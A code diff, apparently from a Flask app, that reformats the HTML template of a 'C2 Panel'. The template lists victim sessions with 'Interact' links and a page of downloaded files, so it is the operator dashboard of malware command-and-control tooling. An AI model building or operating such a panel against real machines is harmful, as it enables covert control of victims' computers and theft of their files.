@@ -18,23 +18,13 @@ init_db()
 HTML = """
 <!DOCTYPE html>
 <html>
-<head><title>C2 Panel</title><style>
-body { font-family: monospace; background: black; color: lime; padding: 20px; }
-table { border-collapse: collapse; width: 100%; }
-th, td { border: 1px solid lime; padding: 8px; text-align: left; }
-a { color: lime; }
-</style></head>
+<head><title>C2 Panel</title><style>body{font-family:monospace;background:black;color:lime;padding:20px;}table{border-collapse:collapse;width:100%;}th,td{border:1px solid lime;padding:8px;text-align:left;}a{color:lime;}</style></head>
 <body>
 <h1>C2 Sessions</h1>
 <table>
 <tr><th>ID</th><th>Info</th><th>Last Seen</th><th>Action</th></tr>
 {% for v in victims %}
-<tr>
-<td>{{ v.id }}</td>
-<td><pre>{{ v.info }}</pre></td>
-<td>{{ v.last_seen }}</td>
-<td><a href="/session/{{ v.id }}">Interact</a></td>
-</tr>
+<tr><td>{{ v.id }}</td><td><pre>{{ v.info }}</pre></td><td>{{ v.last_seen }}</td><td><a href="/session/{{ v.id }}">Interact</a></td></tr>
 {% endfor %}
 </table>
 <p><a href="/downloads">Downloaded Files</a></p>
